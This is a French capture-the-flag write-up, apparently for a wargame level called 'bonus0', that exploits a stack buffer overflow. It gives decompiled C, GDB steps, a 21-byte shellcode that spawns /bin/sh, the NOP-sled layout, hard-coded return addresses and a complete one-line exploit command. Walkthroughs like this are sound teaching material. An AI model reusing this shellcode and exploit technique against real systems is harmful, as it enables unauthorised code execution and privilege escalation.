# Exploit détaillé pour bonus0

## Description du problème

Le binaire bonus0 présente une vulnérabilité de débordement de tampon. Il lit deux entrées utilisateur et les concatène de manière non sécurisée, permettant d'écraser l'adresse de retour sur la pile.

## Caractéristiques du binaire

- Pas de protection RELRO
- Pas de canary sur la pile
- NX désactivé (permet l'exécution de code sur la pile)
- Pas de PIE (les adresses sont prévisibles)

## Code décompilé

```c
void p(char *param_1, char *param_2)
{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0, local_100c, 0x1000);
  pcVar1 = strchr(local_100c, 10);
  *pcVar1 = '\0';
  strncpy(param_1, local_100c, 0x14);
  return;
}

void pp(char *param_1)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
  
  bVar4 = 0;
  p(local_34, &DAT_080486a0);
  p(local_20, &DAT_080486a0);
  strcpy(param_1, local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)(param_1 + (~uVar2 - 1)) = 0x20;
  strcat(param_1, local_20);
  return;
}

undefined4 main(void)
{
  char local_3a [54];
  
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

## Analyse du code

- La fonction `p` lit jusqu'à 4096 octets d'entrée dans un buffer local, puis copie 20 octets dans le paramètre fourni.
- La fonction `pp` appelle `p` deux fois, stockant les résultats dans des buffers locaux de 20 octets chacun.
- `pp` concatène ensuite ces deux buffers dans le paramètre fourni, avec un espace entre eux.
- La fonction `main` appelle `pp` avec un buffer local de 54 octets.

La vulnérabilité principale réside dans le fait que `strncpy` dans `p` ne garantit pas la terminaison de la chaîne, et que `strcpy` et `strcat` dans `pp` peuvent écrire au-delà des limites du buffer `local_3a` dans `main`.

## Shellcode utilisé

```
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

Ce shellcode de 21 octets exécute `/bin/sh`.

[Le reste du README reste inchangé...]

## Structure de l'exploit

1. Première entrée : NOP sled (100 octets) + Shellcode (21 octets)
2. Deuxième entrée : Padding (9 octets) + Adresse de retour (4 octets) + Remplissage (7 octets)

## Importance du NOP sled

Le NOP sled est une série d'instructions "No Operation" (\x90 en hexadécimal) placée avant le shellcode. Son importance est cruciale :

- Chaque NOP ne fait rien et passe à l'instruction suivante.
- Cette série crée une "glissade" vers notre shellcode.
- Peu importe où dans cette glissade on atterrit, on finira par atteindre le shellcode.
- Cette technique augmente considérablement la probabilité de succès de l'exploit, même si l'adresse de retour varie légèrement.

## Étapes détaillées de l'exploitation

1. Analyse du binaire avec GDB :
   ```
   gdb ./bonus0
   (gdb) disass main
   (gdb) disass p
   (gdb) b *p+28
   (gdb) run
   (gdb) x $ebp-0x1008
   ```
   Cela révèle l'adresse du buffer, par exemple 0xbfffe680.

2. Calcul de la plage d'adresses sûre pour le NOP sled :
   - Début : 0xbfffe680 + 61 = 0xbfffe6bd (61 octets pour les arguments et l'espace)
   - Fin : 0xbfffe680 + 100 = 0xbfffe6e4 (100 est la taille du NOP sled)

3. Construction de l'exploit :
   - Première entrée : 
     100 NOPs (\x90) suivis du shellcode de 21 octets
   - Deuxième entrée : 
     9 octets de padding ('A'), adresse de retour, 7 octets de remplissage ('B')

## Commande d'exploitation

```bash
(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
```

## Adresses de retour possibles

- 0xbfffe6d0 (\xd0\xe6\xff\xbf)
- 0xbfffe6c0 (\xc0\xe6\xff\xbf)
- 0xbfffe6e0 (\xe0\xe6\xff\xbf)
- 0xbfffe6a0 (\xa0\xe6\xff\xbf)

Toutes ces adresses sont dans la plage du NOP sled, augmentant les chances de succès de l'exploit.

## Fonctionnement détaillé de l'exploit

1. La première entrée place le NOP sled (100 octets) suivi du shellcode (21 octets) en mémoire.
2. La deuxième entrée écrase l'adresse de retour pour pointer vers une adresse dans le NOP sled.
3. Lors du retour de la fonction, l'exécution saute à l'adresse spécifiée dans le NOP sled.
4. Les instructions NOP sont exécutées une par une, "glissant" jusqu'au shellcode.
5. Le shellcode s'exécute, lançant un shell avec les privilèges de bonus1.

## Pourquoi cela fonctionne

- NX est désactivé, permettant l'exécution de code sur la pile.
- Pas de canary sur la pile, permettant l'écrasement de l'adresse de retour.
- Le grand NOP sled offre une large "cible" pour notre adresse de retour.
- Même si l'adresse varie légèrement, tant qu'elle pointe dans le NOP sled, l'exploit réussira.

## Variabilité et robustesse

- L'adresse exacte peut varier selon l'environnement d'exécution.
- Le NOP sled rend l'exploit plus robuste face à ces variations.
- Tester différentes adresses dans la plage du NOP sled peut être nécessaire.

